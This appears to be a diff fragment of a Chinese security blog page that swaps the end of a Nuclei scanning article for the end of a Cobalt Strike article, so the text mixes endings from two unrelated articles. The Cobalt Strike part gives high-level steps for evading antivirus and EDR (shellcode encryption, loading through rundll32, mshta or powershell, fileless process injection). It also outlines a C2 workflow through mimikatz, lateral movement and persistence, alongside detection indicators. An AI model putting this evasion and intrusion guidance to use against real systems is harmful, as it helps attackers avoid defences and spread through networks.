-</span></span></code></pre></td></tr></table></div></div><h2 id=七小结>七、小结</h2><p>Nuclei 是轻量高效的首选漏扫工具（模板驱动 + 社区活跃）。Nessus 适合企业级全面扫描。漏扫只是第一步，人工验证才是关键——漏扫结果需逐一确认。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/nuclei/>Nuclei</a>
-<a href=/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/>漏洞扫描</a>
-<a href=/tags/%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/>漏扫工具</a>
-<a href=/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/>渗透测试</a>
-<a href=/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/>自动化</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<span>最后更新于 Aug 30, 2026 10:00 +0800</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088132/><div class=article-details><h2 class=article-title>信息收集落地：ARL与Nuclei联动</h2></div></a></article><article><a href=/p/751088107/><div class=article-details><h2 class=article-title>信息收集进阶：Google 语法、JS 分析与云资产测绘</h2></div></a></article><article><a href=/p/751088095/><div class=article-details><h2 class=article-title>MSF 深度实战：模块、Payload 与后渗透</h2></div></a></article><article><a href=/p/751088094/><div class=article-details><h2 class=article-title>Burp Suite 深度实战：模块、插件与配置</h2></div></a></article><article><a href=/p/751088096/><div class=article-details><h2 class=article-title>Yakit 深度实战：模块、插件与脚本</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>1. 改 C2 Profile：自定义流量特征（URI、UA、伪造流量）
+</span></span><span class=line><span class=cl>2. 改监听端口、sleep、jitter，降低固定特征
+</span></span><span class=line><span class=cl>3. 加载器免杀：shellcode 加密 + 白名单程序加载
+</span></span><span class=line><span class=cl>   （rundll32 / mshta / powershell / 白文件）
+</span></span><span class=line><span class=cl>4. 进程注入：注入白进程内存运行，不落地文件
+</span></span><span class=line><span class=cl>5. 加壳/混淆：降低静态特征
+</span></span><span class=line><span class=cl>6. 免杀是与杀软/EDR 的持续对抗，授权内测试
+</span></span></code></pre></td></tr></table></div></div><h2 id=六检测对立面>六、检测（对立面）</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>默认 Beacon 特征：固定端口/UA/流量指纹
+</span></span><span class=line><span class=cl>内存特征、异常进程注入
+</span></span><span class=line><span class=cl>mimikatz/hashdump 行为
+</span></span><span class=line><span class=cl>回连域名/固定时间片
+</span></span><span class=line><span class=cl>EDR 都能识别默认 CS → 必须改特征
+</span></span></code></pre></td></tr></table></div></div><h2 id=完整操作步骤>完整操作步骤</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：启动 teamserver，连接 Client
+</span></span><span class=line><span class=cl>第 2 步：按目标出网情况选正反向 Listener
+</span></span><span class=line><span class=cl>第 3 步：生成 payload（Staged/Stageless），投递执行
+</span></span><span class=line><span class=cl>第 4 步：确认上线，做基础后渗透（shell/mimikatz）
+</span></span><span class=line><span class=cl>第 5 步：建 Socks 隧道、横向移动
+</span></span><span class=line><span class=cl>第 6 步：改特征/免杀，做权限维持
+</span></span></code></pre></td></tr></table></div></div><h2 id=影响与适用>影响与适用</h2><p>C2 工具能把单点失陷扩大为内网批量控制，能力越强、被滥用危害越大。适用范围是授权红队与攻防演练，部署前必须确认授权边界。</p><h2 id=七小结>七、小结</h2><p>CS 深化的关键是：<strong>正反向连接选对场景、Staged/Stageless 选对投递、插件扩展能力、免杀要改特征</strong>。木马生成不只是“点一下生成”，还要考虑目标出不出网、杀软/EDR 能不能过、流量像不像真的。攻防双方都在研究它的指纹。</p><hr></section><footer class=article-footer><section class=article-tags><a href=/tags/cobalt-strike/>Cobalt Strike</a>
+<a href=/tags/c2/>C2</a>
+<a href=/tags/%E5%85%8D%E6%9D%80/>免杀</a>
+<a href=/tags/%E5%90%8E%E6%B8%97%E9%80%8F/>后渗透</a>
+<a href=/tags/%E7%BA%A2%E9%98%9F/>红队</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088097/><div class=article-details><h2 class=article-title>Vshell 深度实战：功能模块与免杀</h2></div></a></article><article><a href=/p/751088095/><div class=article-details><h2 class=article-title>MSF 深度实战：模块、Payload 与后渗透</h2></div></a></article><article><a href=/p/751088142/><div class=article-details><h2 class=article-title>免杀实战深化</h2></div></a></article><article><a href=/p/751088092/><div class=article-details><h2 class=article-title>CobaltStrike 基础与 Beacon 实战</h2></div></a></article><article><a href=/p/751088091/><div class=article-details><h2 class=article-title>免杀基础与对抗（shellcode 混淆/进程注入/AMSI 绕过）</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
 2020 -
 2026 SoulJian小站</div><div class=busuanzi-count><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><span class=site-uv title=访客数><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="visitor-icon"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 <span id=busuanzi_value_site_uv></span>
